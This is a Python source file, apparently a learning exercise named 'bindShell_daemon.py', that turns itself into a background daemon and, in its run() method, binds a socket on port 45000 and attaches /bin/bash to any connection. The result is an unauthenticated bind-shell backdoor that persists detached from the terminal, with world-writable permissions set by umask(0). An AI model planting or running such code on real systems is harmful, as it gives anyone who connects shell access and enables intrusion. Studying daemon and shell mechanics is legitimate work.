"""
check listening ports with netstat -plant | head
steps to creating a daemon
1. Fork a child process
2. Close parent process
3. change the processes' home directory to /tmp
4. move the process to system daemon
5. make default permissions for all files and directories created by the process
6. unhook stdin, stdout, stderr from terminal
7. delete any existing pid file and then make a new one -- this is so you can stop the process later

"""
import os
import sys
import atexit
import socket
import subprocess
import signal
import sys
import time


class Daemon():
    def __init__(self, pid_file):
        self.pid_file = pid_file
    
    def delete_pid(self):
        os.remove(self.pid_file)
	
    def daemonize(self):
        # fork and have the parent exit
        # fork returns 0 to the child and returns the pid of the child to the parent
        # any pid value less than 0 means there was an error creating the child

        if(os.fork()):
            sys.exit()
    
        # we need a reliable working directory. This becomes the home directory for this process
        os.chdir("/tmp")
    
        # To become the session leader of this new session and the process group
		# leader of the new process group, we call os.setsid(). The process is
		# also guaranteed not to have a controlling terminal.
        os.setsid()
        
        # Set the default permissions of files/directories created by this process with umask()
        os.umask(0)

        # close all File Descriptors
        # detach sys.stdin and reattach the FDs to /dev/null
        with open("/dev/null", "r") as null_stdin:
            os.dup2(null_stdin.fileno(), sys.stdin.fileno())
        
        with open("/dev/null", "w") as null_stdout:
            os.dup2(null_stdout.fileno(), sys.stdout.fileno())
        
        with open("/dev/null", "w") as null_stderr:
            os.dup2(null_stderr.fileno(), sys.stderr.fileno())
        
        # delete the old PID file at daemon exit and create a new one when calling the daemon
        # "~/bindShell_daemon.pid"
        atexit.register(self.delete_pid)
        
        pid = str(os.getpid())
        
        with open(self.pid_file, "w+") as file:
            file.write(pid)
            
    def run(self):
        # Replace the following with your own code here.
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("127.0.0.1", 45000))
        sock.listen()
        connection, address = sock.accept()
        sock_fd = connection.fileno()
        subprocess.Popen("/bin/bash", stdin=sock_fd, stdout=sock_fd, stderr=sock_fd)        
            
    def read_pid(self):
        # must return an integer not a string. os.kill doesn't work on strings
        try:
            with open(self.pid_file, "r") as pid_file:
                pid = int(pid_file.read().strip())
                return pid
        except IOError:
            return
    
    def start(self):
        # first check if the PID file already exists. If it does that means the daemon hasn't exited because
        # atexit.register() would have activated
        print("running...")
        
        if(self.read_pid()):
            print("An error occured while starting this process. Does the process already exist?")
            sys.exit()
            
        self.daemonize()
        self.run()
    
    def stop(self):
        # first check if a PID file exists. If not then there is no daemon to stop
        print("stopping...")
        
        pid = self.read_pid()
        
        if(not pid):
            print("An error occured while stopping this process. Is the daemon not running?")
            sys.exit()
            
        # kill the process by sending a termination signal to it
        try:
            while(True):
                os.kill(pid, signal.SIGTERM)
                time.sleep(0.1)
        except OSError as err:
            if("No such process" in err.strerror and os.path.exists(self.pid_file)):
                os.remove(self.pid_file)
            else:
                print(err)
                sys.exit()
                
    def restart(self):
        self.stop()
        self.start()
        
def main(sysargv):
    if(len(sysargv) > 1):
        print("bindShell_daemon.py [start/stop/restart]")
    
    daemon = Daemon("/tmp/pid")
    
    if(sysargv[0] == "start"):
        daemon.start()
        
    elif(sysargv[0] == "stop"):
        daemon.stop()
    
    elif(sysargv[0] == "restart"):
        daemon.restart()
        
        
if(__name__ == "__main__"):
    main(sys.argv[1:])
